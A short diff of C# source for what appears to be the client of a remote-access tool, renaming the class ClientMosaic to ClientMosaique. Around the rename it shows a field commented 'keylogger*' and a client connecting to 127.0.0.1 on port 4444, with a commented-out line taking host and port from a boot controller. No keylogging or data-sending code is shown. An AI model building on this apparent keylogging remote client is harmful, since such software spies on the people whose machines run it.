@@ -10,7 +10,7 @@ namespace Client
 {
     static class Program
     {
-        public static ClientMosaic client;
+        public static ClientMosaique client;
         public static Boot bootController;
         private static ApplicationContext _msgLoop; // keylogger*
         private static bool _result;
@@ -34,7 +34,7 @@ namespace Client
             Application.SetCompatibleTextRenderingDefault(false);
             if (RunMosaique())
             {
-                client = new ClientMosaic("127.0.0.1", 4444);
+                client = new ClientMosaique("127.0.0.1", 4444);
                 //client = new ClientMosaic(bootController.host, bootController.port);
                 client.connect();
             }
